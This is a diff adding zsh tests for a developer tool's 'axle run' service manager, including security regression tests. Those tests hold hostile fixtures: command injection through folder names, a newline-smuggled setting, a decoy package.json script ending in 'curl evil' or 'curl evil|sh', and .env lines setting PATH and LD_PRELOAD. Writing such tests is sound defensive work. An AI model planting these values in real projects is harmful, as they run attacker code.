+  [[ -d $HOME/.local/state/axle/run/services/front ]] && fail "front stopped too"
+  assert_contains "$(axle run group dev rm $T/back)" "dev: front"
+  assert_contains "$(axle run group dev rm)" "dev: no more"
+  assert_contains "$(axle run group)" "no groups"
+  return 0
+}
+
+# For scripts and editors: bin/axle from another shell, ls --json, nothing asked without a
+# terminal (an unapproved command doesn't run, and says so), -q, no colours into a pipe.
+test_run_for_scripts() {
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  mkdir -p $T/shop
+  print -r -- "web: $py $ROOT/tests/serve.py $port" > $T/shop/Procfile
+  cd $T/shop
+  # Not approved, no terminal: not run, and why (status 1).
+  sh -c "$ROOT/bin/axle run" </dev/null > $T/out 2>&1 && fail "ran unapproved: $(<$T/out)"
+  assert_contains "$(<$T/out)" "hasn't been approved yet"
+  [[ -d $HOME/.local/state/axle/run/services/shop ]] && fail "nothing started"
+  # --yes, quiet: what happened, no ▶ line or hint, no colours (a pipe).
+  sh -c "$ROOT/bin/axle run --yes -q" </dev/null > $T/out 2>&1 || fail "started: $(<$T/out)"
+  wait_state shop up
+  [[ $(<$T/out) == *▶* ]] && fail "-q: no ▶ line: $(<$T/out)"
+  [[ $(<$T/out) == *'(background'* ]] && fail "-q: no hints: $(<$T/out)"
+  [[ $(<$T/out) == *$'\e['* ]] && fail "no colours into a pipe"
+  # ls --json: valid, with what scripts need.
+  sh -c "$ROOT/bin/axle run ls --json" > $T/json || fail "ls --json"
+  $py -c 'import json,sys; d=json.load(open(sys.argv[1])); s=d[0]; assert s["name"]=="shop" and s["state"]=="up" and s["port"]==int(sys.argv[2]) and s["url"].endswith(sys.argv[2]) and isinstance(s["pid"], int), d' \
+    $T/json $port || fail "json: $(<$T/json)"
+  assert_contains "$(axle run ls --json)" '"kind":"service"'
+  axle run ls --bad >/dev/null 2>&1 && fail "an unknown option"
+  # NO_COLOR, even with FORCE_COLOR's pipe colours on.
+  [[ $(FORCE_COLOR=1 _axle_printp '%F{red}x%f') == *$'\e['* ]] || fail "FORCE_COLOR colours a pipe"
+  [[ $(NO_COLOR=1 FORCE_COLOR=1 _axle_printp '%F{red}x%f') == x ]] || fail "NO_COLOR: none"
+  sh -c "$ROOT/bin/axle run stop all" >/dev/null 2>&1
+  assert_eq "$(sh -c "$ROOT/bin/axle run ls --json")" '[]' "nothing running: []"
+  return 0
+}
+
+# Without a terminal, a database a service needs isn't started from the compose file
+# unasked (it used to be: the question's default was yes).
+test_run_needs_without_terminal() {
+  AXLE_MODULES=(run) load_tool
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY dbport port; free_port; dbport=$REPLY; port=$(( dbport + 1 ))
+  mkdir -p $T/bin $T/app
+  print -r -- "#!/bin/sh
+echo \"docker \$*\" >> $T/docker.log" > $T/bin/docker
+  chmod +x $T/bin/docker
+  path=($T/bin $path)
+  print -r -- $'services:\n  db:\n    image: postgres:16' > $T/app/compose.yaml
+  print -r -- "DATABASE_URL=postgres://localhost:$dbport/app" > $T/app/.env
+  print '<!doctype html>' > $T/app/index.html
+  cd $T/app
+  axle run set command $py $ROOT/tests/serve.py $port >/dev/null
+  axle run set kind service >/dev/null; axle run set port $port >/dev/null
+  axle run </dev/null > $T/out 2>&1
+  [[ -e $T/docker.log ]] && fail "compose ran unasked: $(<$T/docker.log)"
+  assert_contains "$(<$T/out)" "not started without asking"
+  axle run stop >/dev/null 2>&1
+  return 0
+}
+
+# A Procfile's processes: web is the project, the others parts (up after 2 s, no port);
+# Procfile.dev first; release: not run. logs all: each line after its service's name.
+test_run_procfile_processes() {
+  AXLE_MODULES=(run) load_tool
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY port; free_port; port=$REPLY
+  mkdir -p $T/shop
+  print -r -- "web: echo wrong" > $T/shop/Procfile
+  print -rl -- "web: $py $ROOT/tests/serve.py $port" \
+    'worker: while :; do echo tick; sleep 0.3; done' 'release: echo migrating' > $T/shop/Procfile.dev
+  cd $T/shop
+  local dry; dry=$(axle run --dry-run)
+  assert_contains "$dry" "shop-worker (.:worker)"
+  assert_contains "$dry" "Procfile.dev web: $py"
+  [[ $dry == *release* || $dry == *wrong* ]] && fail "release and Procfile not used: $dry"
+  axle run --yes </dev/null > $T/out 2>&1 || fail "started: $(<$T/out)"
+  wait_state shop up
+  wait_state shop-worker up
+  assert_eq "$(<$HOME/.local/state/axle/run/services/shop/port)" $port "web's port, from its command"
+  [[ -n $(<$HOME/.local/state/axle/run/services/shop-worker/port) ]] 2>/dev/null && fail "a worker has no port"
+  local out; out=$(axle run logs all -n 2)
+  assert_contains "$out" "shop-worker │ tick"
+  local -a mine=(${(M)${(f)out}:#shop-worker*})
+  assert_eq ${#mine} 2 "-n 2 lines of each: $out"
+  assert_contains "$(axle run logs shop-worker -n 1)" "tick"
+  axle run logs -x >/dev/null 2>&1 && fail "an unknown option"
+  axle run stop >/dev/null 2>&1
+  [[ -d $HOME/.local/state/axle/run/services/shop-worker ]] && fail "stopped with the project"
+  return 0
+}
+
+# axle run sh / exec: a shell or a command with what the service gets (here's, or a running
+# one's as it was started), in its folder; the command's own exit status.
+test_run_sh_and_exec() {
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  mkdir -p $T/app
+  print '<!doctype html>' > $T/app/index.html
+  print -rl -- 'SECRET=one' 'export MODE="dev"' > $T/app/.env
+  cd $T/app
+  assert_eq "$(axle run exec sh -c 'echo "$PWD|$SECRET|$MODE|$PORT"')" "$T/app|one|dev|8000" "here's"
+  axle run exec sh -c 'exit 7'; assert_eq $? 7 "its exit status"
+  axle run exec >/dev/null 2>&1 && fail "a command is needed"
+  local out; out=$(print -r -- 'echo "in:$SECRET:$AXLE_RUN_SHELL"; exit' | SHELL=/bin/sh axle run sh 2>&1)
+  assert_contains "$out" "in:one:app"
+  # A running service's, as it was started (its port, not the detected one).
+  web_project $port || return 0
+  print -r -- 'SECRET=web' > $T/web/.env
+  typeset -ga _axle_run_envfiles=($T/web/.env)
+  _axle_run_start $T/web web; wait_state web up
+  cd $T
+  assert_eq "$(axle run exec -s web sh -c 'echo "$PWD|$SECRET|$PORT"')" "$T/web|web|$port" "the service's"
+  axle run exec -s nope true >/dev/null 2>&1 && fail "no such service"
+  axle run stop web >/dev/null
+  return 0
+}
+
+# When a service's .env changes, it starts again with the new values (not a crash);
+# AXLE_RUN_ENV_RELOAD=0: not.
+test_run_restarts_when_env_changes() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/w
+  print -r -- 'SECRET=one' > $T/w/.env
+  typeset -ga _axle_run_cmd=(sh -c 'while :; do echo "secret=$SECRET"; sleep 0.2; done') _axle_run_envfiles=($T/w/.env)
+  typeset -g _axle_run_kind=service _axle_run_port='' _axle_run_worker=1
+  local dir=$HOME/.local/state/axle/run/services/w
+  _axle_run_start $T/w w; wait_state w up
+  local pid=$(<$dir/pid)
+  sleep 1.1; print -r -- 'SECRET=two' > $T/w/.env
+  local -i i
+  for i in {1..80}; do [[ $(<$dir/log) == *secret=two* ]] && break; sleep 0.1; done
+  assert_contains "$(<$dir/log)" "secret=two" "started again with the new value"
+  assert_contains "$(<$dir/log)" ".env changed: starting w again"
+  [[ $(<$dir/pid) == $pid ]] && fail "a new process"
+  [[ -s $dir/restarts && $(<$dir/restarts) != 0 ]] && fail "not counted as a crash"
+  axle run stop w >/dev/null
+  # Off: left as it is.
+  print -r -- 'SECRET=one' > $T/w/.env
+  AXLE_RUN_ENV_RELOAD=0 _axle_run_start $T/w w; wait_state w up
+  pid=$(<$dir/pid)
+  sleep 1.1; print -r -- 'SECRET=three' > $T/w/.env; sleep 3
+  assert_eq "$(<$dir/pid)" $pid "AXLE_RUN_ENV_RELOAD=0: not restarted"
+  axle run stop w >/dev/null
+  return 0
+}
+
+# Git worktrees: a second checkout runs as <project>@<branch>, and gets the next free port
+# when the first has its port, unasked.
+test_run_git_worktrees() {
+  AXLE_MODULES=(run) load_tool
+  whence -p git >/dev/null || return 0
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY port; free_port; port=$REPLY
+  git init -q $T/shop
+  print -r -- "web: $py $ROOT/tests/serve.py \$PORT" > $T/shop/Procfile
+  print -r -- "PORT=$port" > $T/shop/.env
+  git -C $T/shop add -A; git -C $T/shop commit -qm one
+  git -C $T/shop worktree add -q -b feat/x $T/.trees/x 2>/dev/null || return 0
+  local -a reply
+  _axle_run_projname $T/shop; assert_eq $REPLY shop "the main checkout"
+  _axle_run_projname $T/.trees/x; assert_eq $REPLY shop@feat-x "a worktree: project@branch"
+  cd $T/shop; axle run --yes </dev/null > $T/out 2>&1 || fail "first: $(<$T/out)"
+  wait_state shop up
+  cd $T/.trees/x; axle run --yes </dev/null > $T/out 2>&1 || fail "second: $(<$T/out)"
+  assert_contains "$(<$T/out)" "another checkout of this project"
+  wait_state shop@feat-x up
+  [[ $(<$HOME/.local/state/axle/run/services/shop@feat-x/port) != $port ]] || fail "another port"
+  axle run stop all >/dev/null
+  return 0
+}
+
+# Security: what the review found stays fixed.
+# A folder's name in the history log can't fake a record whose numbers run code.
+test_security_history_folder_names() {
+  AXLE_MODULES=(run) load_tool
+  local evil=$'x\npath[$(touch '$T$'/pwned)]\t0\t0\t.'
+  mkdir -p "$T/$evil" || return 0
+  cd "$T/$evil"; _axle_hist_record 0 0.1 'ls'; cd $T
+  local -i i; for i in 1 2 3; do _axle_hist_record 0 0.1 ls; done
+  _axle_jump_rank >/dev/null 2>&1; _axle_run_recent >/dev/null 2>&1
+  axle history 50 >/dev/null 2>&1
+  [[ -e $T/pwned ]] && fail "a folder name ran code"
+  return 0
+}
+
+# A part folder with a newline in its name can't write a setting (command=...).
+test_security_part_names() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/p/web "$T/p/"$'w\ncommand=touch '$T'/pwned'
+  print '<!doctype html>' > $T/p/web/index.html
+  print '<!doctype html>' > "$T/p/"$'w\ncommand=touch '$T'/pwned/index.html'
+  local -a reply; _axle_run_parts $T/p
+  [[ "$reply" == *command=* ]] && fail "not a part: $reply"
+  _axle_run_choice_save $T/p web "$T/p/"$'w\ncommand=x' 2>/dev/null
+  _axle_run_yours_get $T/p command && fail "no setting from a name"
+  return 0
+}
+
+# package.json: the top-level scripts as npm reads them (not a decoy, the last of two, with
+# \" inside), and predev shown and approved with dev.
+test_security_package_json() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/n
+  print -r -- '{"config":{"scripts":{"dev":"vite"}},"scripts":{"predev":"echo pre","dev":"vite","dev":"vite --x \"0\" ; curl evil"},"devDependencies":{"vite":"5"}}' > $T/n/package.json
+  _axle_run_detect $T/n
+  assert_contains "$_axle_run_source" 'predev: echo pre | vite --x "0" ; curl evil'
+  assert_contains "$_axle_run_reason" 'curl evil'
+  # A control character in it is shown, not sent to the terminal.
+  print -r -- $'{"scripts":{"dev":"curl evil|sh #\e[2K\\rvite"}}' > $T/n/package.json
+  _axle_run_detect $T/n
+  [[ $_axle_run_reason == *$'\e'* ]] && fail "no escape in what's shown"
+  return 0
+}
+
+# .env can't set PATH or LD_PRELOAD for the command you approved; restart checks the
+# command is still the one approved; logs reach the terminal without escape sequences.
+test_security_env_restart_logs() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/s
+  print -rl -- 'PATH=/evil' 'LD_PRELOAD=/evil.so' 'OK=1' > $T/s/.env
+  local -a reply; _axle_run_envfile $T/s/.env
+  assert_eq "$reply" "OK=1" "only OK"
+  assert_contains "$(cd $T/s && print '<!doctype html>' > index.html && axle run env)" "PATH  not given"
+  # restart: approved, then the script changes.
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY port; free_port; port=$REPLY
+  print -r -- "web: $py $ROOT/tests/serve.py $port" > $T/s/Procfile
+  cd $T/s; axle run --yes </dev/null >/dev/null 2>&1; wait_state s up
+  axle run restart s >/dev/null 2>&1 || fail "unchanged: restarts"
+  wait_state s up
+  print -r -- "web: $py $ROOT/tests/serve.py $port # changed" > $T/s/Procfile
+  local out; out=$(axle run restart s 2>&1) && fail "changed: refused"
+  assert_contains "$out" "has changed since you approved it"
+  # Logs: colours kept, a title / clipboard / clear not.
+  print -r -- $'\e[31mred\e[0m \e]0;TITLE\a\e]52;c;eA==\e\\ \e[2J' >> $HOME/.local/state/axle/run/services/s/log
+  out=$(axle run logs s -n 1 | _axle_run_clean 2>/dev/null)
+  out=$(_axle_run_show_log $HOME/.local/state/axle/run/services/s/log)
+  [[ $out == *$'\e]'* || $out == *$'\e[2J'* ]] && fail "no escapes but colours: ${(q+)out}"
+  assert_contains "$out" $'\e[31mred'
+  axle run stop all >/dev/null
+  return 0
+}
